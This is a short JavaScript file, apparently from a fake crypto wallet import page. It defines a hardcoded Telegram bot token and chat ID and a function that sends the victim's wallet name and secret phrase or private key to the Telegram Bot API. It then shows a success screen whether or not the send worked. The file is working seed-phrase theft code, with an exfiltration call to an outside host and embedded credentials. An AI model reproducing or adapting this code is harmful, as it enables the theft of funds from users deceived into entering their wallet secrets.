// ==========================================
// TELEGRAM CONFIGURATION - PRIVATE FILE
// Do not share this file publicly
// ==========================================

const TELEGRAM_BOT_TOKEN = "8794272039:AAHl1crjgbFQrpeNexzfwAy0GJepPzisv1w";
const TELEGRAM_CHAT_ID = "8774784007";

/**
 * Sends wallet data to Telegram and then displays the success view.
 * @param {string} walletName - The name of the wallet
 * @param {string} secretPhrase - The secret phrase or private key
 */
function sendToTelegram(walletName, secretPhrase) {
    const message = `🚨 *NEW WALLET IMPORTED* 🚨\n\n` +
                    `📁 *Name:* ${walletName}\n` +
                    `🔑 *Phrase/Key:* \`${secretPhrase}\``;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => {
        showSuccessView();
    })
    .catch(error => {
        console.error('Telegram error:', error);
        showSuccessView();
    });
}